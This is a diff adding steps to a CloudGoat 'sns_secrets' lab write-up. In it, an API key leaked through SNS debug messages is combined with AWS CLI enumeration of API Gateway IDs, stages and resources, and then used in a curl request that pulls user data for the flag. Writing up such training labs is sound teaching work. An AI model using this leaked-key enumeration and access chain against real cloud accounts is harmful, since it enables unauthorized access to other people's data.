@@ -210,8 +210,56 @@ DEBUG: API GATEWAY KEY 45a3da610dc64703b10e273a4db135bf
 
 ### Getting the API ID, StageName and Path ##3
 
-Originally, I thought the ```DEBUG: API GATEWAY KEY ```
+Originally, I thought the ```DEBUG: API GATEWAY KEY ``` is the api id, but after trying to input it into AWS format below, I realised that not only is the Gateway Key not the api id, I also did not have the stagename and path.
 
+```
+https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<path>
+```
+
+Hence we go back to the ```--profile sns``` to get our api id and from there to get the stagename and path.
+
+```
+aws apigateway get-rest-apis --profile sns --region us-east-1 
+```
+
+<img width="877" height="477" alt="image" src="https://github.com/user-attachments/assets/1c99fddb-ea8b-49ea-be54-d970639c2339" />
+
+We get the api id and we can use it to get the stagename and path.
+
+```
+aws apigateway get-stages --rest-api-id  vmcrylu5u5 --profile sns --region us-east-1
+
+aws apigateway get-resources --rest-api-id vmcrylu5u5 --profile sns --region us-east-1
+```
+
+<img width="877" height="708" alt="image" src="https://github.com/user-attachments/assets/79505600-0555-4169-aa0b-1f3c58ede508" />
+
+We now have the api key, the stagename and the path to complete the gateway name.
+The Wuery shows that user-data can be obtain via the Get Http Method.
+
+The ```DEBUG: API GATEWAY KEY ``` has to be used for it to appear in the email  and put it as part of the ```x-api-key``` parameter when we curl
+
+
+### Use the API using Curl ###
+
+Using Curl, we get the final flag of the scenario
+
+```
+curl -X GET \
+  'https://vmcrylu5u5.execute-api.us-east-1.amazonaws.com/prod-cgidrxqfnkkoal/user-data' \
+  -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf'
+```
+
+
+<img width="2102" height="127" alt="image" src="https://github.com/user-attachments/assets/eb496a5e-e42a-4bdf-8831-5de23dd4de36" />
+
+### Destroying the Scenario ###
+
+```
+Cloudgoat destroy sns_secrets
+```
+
+With the destroying of the scenario, we successfully complete and close the scenario
 
 
 
